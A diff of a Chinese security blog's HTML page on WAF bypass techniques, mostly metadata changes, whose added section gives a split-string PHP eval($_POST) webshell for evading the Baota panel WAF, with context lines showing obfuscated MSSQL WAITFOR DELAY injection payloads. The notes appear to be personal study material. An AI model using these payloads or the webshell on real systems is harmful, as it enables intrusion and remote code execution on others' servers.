@@ -107,7 +107,7 @@
 <meta property="og:site_name" content="v1rus blog">
 <meta property="og:description" content="Waf Bypass技巧0x01 前言​    实际生产环境中即使存在版本的漏洞但是由于waf的存在可能导致exp无法在服务器内部执行，所以根据各种各样的环境情况需要具体分析，具体fuzz。很早就想展开这个系列，快点学习！ 一下主要是在看wafbypass公众号上学习的整理笔记。 waf防护一般有：云waf，硬件waf，软件waf等。 一、利用服务器特性主要是利用服务器端对一些特殊字符或者特服字符">
 <meta property="article:published_time" content="2020-12-05T11:39:49.125Z">
-<meta property="article:modified_time" content="2020-12-06T09:50:38.735Z">
+<meta property="article:modified_time" content="2021-09-09T05:47:25.171Z">
 <meta property="article:author" content="Virusday">
 <meta property="article:tag" content="Learn">
 <meta name="twitter:card" content="summary">
@@ -333,8 +333,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-12-06T17:50:38+08:00">
-                2020-12-06
+              <time title="更新于" itemprop="dateModified" datetime="2021-09-09T13:47:25+08:00">
+                2021-09-09
               </time>
             
           </span>
@@ -361,7 +361,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2.8k
+                  3k
                 </span>
               
 
@@ -377,7 +377,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  12
+                  13
                 </span>
               
             </div>
@@ -542,6 +542,10 @@
 <p>id=1;Exec(‘WA’+’ITFOR DELAY ‘’0:0:5’’’)</p>
 <p>id=1;declare @test nvarchar(50);set @test=’wait’+’for delay ‘’0:0:5’’’;exec sp_executesql @test</p>
 <h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>1、首先填充方式：MSSQL可以看出来<strong>%00-%20的填充符号</strong>、<strong>注释符号</strong>、<strong>特殊符号交集</strong>在这些中间是通用的，先fuzz这些通用符号（00-20,2a,2f,2e,3a），如果都不行，那么ASP可能首先没办法绕过（因为位置二的关系）。aspx再针对每个位置去fuzz。</p>
+<h2 id="五-PHP绕过"><a href="#五-PHP绕过" class="headerlink" title="五 PHP绕过"></a>五 PHP绕过</h2><h3 id="1-php-宝塔"><a href="#1-php-宝塔" class="headerlink" title="1 php+宝塔"></a>1 php+宝塔</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php ev&#39;.&#39;al($_PO&#39;.&#39;ST[x]?)&gt; 相当于&lt;?php eval($_POST[x])?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模拟预处理用于数据库不支持预编译机制的情况，其本质是在底层先对用户输入进行转义后，再对SQL语句进行拼接，然后将完整的语句发送给数据库执行。任何可控的拼接都是具有一定危险性的，在PHP 5.3.6前，这种转义是通过单字节字符集来完成的，因此存在宽字节注入。但在正确设置字符集的前提下，不可否认这种方式是可以防止SQL注入的。</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -659,7 +663,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-count">75</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -703,23 +707,23 @@
                 
                 
                   <li class="recent_posts_li">
+                    <a href="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/" title="十月整理的问题/1" target="_blank">十月整理的问题/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/09/22/%E6%9D%82%E9%97%AE%E9%A2%98/1/" title="杂问题/1" target="_blank">杂问题/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/09/16/Oracle%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/1/" title="Oracle注入技巧/1" target="_blank">Oracle注入技巧/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/" title="java/绕过高版本的ldap+rmi/1" target="_blank">java/绕过高版本的ldap+rmi/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
                     <a href="/2021/07/19/java/java%E9%80%86%E5%90%91/1/" title="java/java逆向/1" target="_blank">java/java逆向/1</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2021/07/15/%E8%BF%87d%E7%9B%BE%E5%B0%8F%E9%A9%AC%E5%88%86%E6%9E%90/1/" title="过d盾小马分析/1" target="_blank">过d盾小马分析/1</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/" title="java/shiro配合spring/1" target="_blank">java/shiro配合spring/1</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2021/06/15/java/el%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%8ESPel%E8%A1%A8%E8%BE%BE%E5%BC%8F/1/" title="java/el表达式与SPel表达式/1" target="_blank">java/el表达式与SPel表达式/1</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/" title="java/java命令执行底层/1" target="_blank">java/java命令执行底层/1</a>
                   </li>
                 
               </ul>
@@ -747,7 +751,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Waf-Bypass技巧"><span class="nav-number">1.</span> <span class="nav-text">Waf Bypass技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一、利用服务器特性"><span class="nav-number">1.2.</span> <span class="nav-text">一、利用服务器特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、-特性（ASP-IIS）"><span class="nav-number">1.2.1.</span> <span class="nav-text">1、%特性（ASP+IIS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、-u特性（asp-iis和aspx-iis）"><span class="nav-number">1.2.2.</span> <span class="nav-text">2、%u特性（asp+iis和aspx+iis）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、另类-u特性（ASP-IIS）"><span class="nav-number">1.2.3.</span> <span class="nav-text">3、另类%u特性（ASP+IIS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、apache畸形method"><span class="nav-number">1.2.4.</span> <span class="nav-text">4、apache畸形method</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、应用层特性"><span class="nav-number">1.3.</span> <span class="nav-text">二、应用层特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、大小写-关键词的替换。"><span class="nav-number">1.3.1.</span> <span class="nav-text">1、大小写&#x2F;关键词的替换。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、双重url编码"><span class="nav-number">1.3.2.</span> <span class="nav-text">2、双重url编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、变更请求方式"><span class="nav-number">1.3.3.</span> <span class="nav-text">3、变更请求方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、HPP参数污染-重点"><span class="nav-number">1.3.4.</span> <span class="nav-text">4、HPP参数污染(重点)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、宽字节（利用度不高）"><span class="nav-number">1.3.5.</span> <span class="nav-text">5、宽字节（利用度不高）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、WAF层特性"><span class="nav-number">1.4.</span> <span class="nav-text">三、WAF层特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、逻辑问题"><span class="nav-number">1.4.1.</span> <span class="nav-text">1、逻辑问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、性能问题"><span class="nav-number">1.4.2.</span> <span class="nav-text">2、性能问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、白名单"><span class="nav-number">1.4.3.</span> <span class="nav-text">3、白名单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、数据库特性"><span class="nav-number">1.5.</span> <span class="nav-text">四、数据库特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、Mysql数据库特性"><span class="nav-number">1.5.1.</span> <span class="nav-text">1、Mysql数据库特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-测试"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">0x02 测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、-SQLServer数据库特性"><span class="nav-number">1.5.2.</span> <span class="nav-text">2、 SQLServer数据库特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-特性"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">0x02 特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-测试"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">0x03 测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-常见函数"><span class="nav-number">1.5.2.3.</span> <span class="nav-text">0x03 常见函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-总结"><span class="nav-number">1.5.2.4.</span> <span class="nav-text">0x04 总结</span></a></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Waf-Bypass技巧"><span class="nav-number">1.</span> <span class="nav-text">Waf Bypass技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一、利用服务器特性"><span class="nav-number">1.2.</span> <span class="nav-text">一、利用服务器特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、-特性（ASP-IIS）"><span class="nav-number">1.2.1.</span> <span class="nav-text">1、%特性（ASP+IIS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、-u特性（asp-iis和aspx-iis）"><span class="nav-number">1.2.2.</span> <span class="nav-text">2、%u特性（asp+iis和aspx+iis）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、另类-u特性（ASP-IIS）"><span class="nav-number">1.2.3.</span> <span class="nav-text">3、另类%u特性（ASP+IIS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、apache畸形method"><span class="nav-number">1.2.4.</span> <span class="nav-text">4、apache畸形method</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、应用层特性"><span class="nav-number">1.3.</span> <span class="nav-text">二、应用层特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、大小写-关键词的替换。"><span class="nav-number">1.3.1.</span> <span class="nav-text">1、大小写&#x2F;关键词的替换。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、双重url编码"><span class="nav-number">1.3.2.</span> <span class="nav-text">2、双重url编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、变更请求方式"><span class="nav-number">1.3.3.</span> <span class="nav-text">3、变更请求方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、HPP参数污染-重点"><span class="nav-number">1.3.4.</span> <span class="nav-text">4、HPP参数污染(重点)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、宽字节（利用度不高）"><span class="nav-number">1.3.5.</span> <span class="nav-text">5、宽字节（利用度不高）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、WAF层特性"><span class="nav-number">1.4.</span> <span class="nav-text">三、WAF层特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、逻辑问题"><span class="nav-number">1.4.1.</span> <span class="nav-text">1、逻辑问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、性能问题"><span class="nav-number">1.4.2.</span> <span class="nav-text">2、性能问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、白名单"><span class="nav-number">1.4.3.</span> <span class="nav-text">3、白名单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、数据库特性"><span class="nav-number">1.5.</span> <span class="nav-text">四、数据库特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、Mysql数据库特性"><span class="nav-number">1.5.1.</span> <span class="nav-text">1、Mysql数据库特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-测试"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">0x02 测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、-SQLServer数据库特性"><span class="nav-number">1.5.2.</span> <span class="nav-text">2、 SQLServer数据库特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-特性"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">0x02 特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-测试"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">0x03 测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-常见函数"><span class="nav-number">1.5.2.3.</span> <span class="nav-text">0x03 常见函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-总结"><span class="nav-number">1.5.2.4.</span> <span class="nav-text">0x04 总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五-PHP绕过"><span class="nav-number">1.6.</span> <span class="nav-text">五 PHP绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-php-宝塔"><span class="nav-number">1.6.1.</span> <span class="nav-text">1 php+宝塔</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -789,7 +793,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">90.8k</span>
+    <span title="Site words total count">103.8k</span>
   
 </div>
 -->
